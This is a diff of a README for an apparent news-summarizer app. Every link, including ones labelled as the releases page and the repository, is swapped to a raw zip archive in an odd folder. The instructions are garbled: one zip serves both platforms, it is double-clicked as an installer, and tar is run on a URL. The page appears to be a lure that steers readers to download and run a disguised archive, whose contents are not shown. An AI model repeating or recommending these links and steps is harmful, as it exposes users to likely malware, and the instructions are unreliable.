@@ -1,7 +1,7 @@
 # 📰 rag-news-summarizer - Summarize News Effortlessly
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip)](https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip)
+[![Download](https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip)](https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -20,20 +20,20 @@ Before you install the application, ensure that your computer meets these basic 
 
 To download the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip) to find the latest version of the software.
    
-2. **Select the Right File:** Look for the file labeled as **https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip** for Windows or **https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip** for macOS/Linux.
+2. **Select the Right File:** Look for the file labeled as **https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip** for Windows or **https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip** for macOS/Linux.
 
 3. **Download the File:** Click on the file to download it. Save it to a location you can easily find, like your Desktop or Downloads folder.
 
 4. **Run the Installer:**
    - For Windows: 
      1. Navigate to the folder where you saved the file.
-     2. Double-click **https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip**.
+     2. Double-click **https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip**.
      3. Follow the on-screen instructions to complete the installation.
    - For macOS/Linux:
      1. Open the Terminal and navigate to where the downloaded file is located.
-     2. Run the following command: `tar -xvzf https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip`.
+     2. Run the following command: `tar -xvzf https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip`.
      3. Then run the application with: `./rag-news-summarizer`.
 
 5. **Open the Application:** Once installed, locate the application on your computer. Double-click to open.
@@ -95,7 +95,7 @@ This application is licensed under the MIT License. You are free to use, modify,
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/SattikMohanta/rag-news-summarizer/main/node_modules/reveal.js/plugin/notes/news-summarizer-rag-1.3-beta.3.zip)
+- [Releases Page](https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip)
+- [GitHub Repository](https://github.com/SattikMohanta/rag-news-summarizer/raw/refs/heads/main/_posts/summarizer_rag_news_v1.7.zip)
 
 If you have any questions or feedback, feel free to reach out through the repository. Enjoy your summarizing experience!
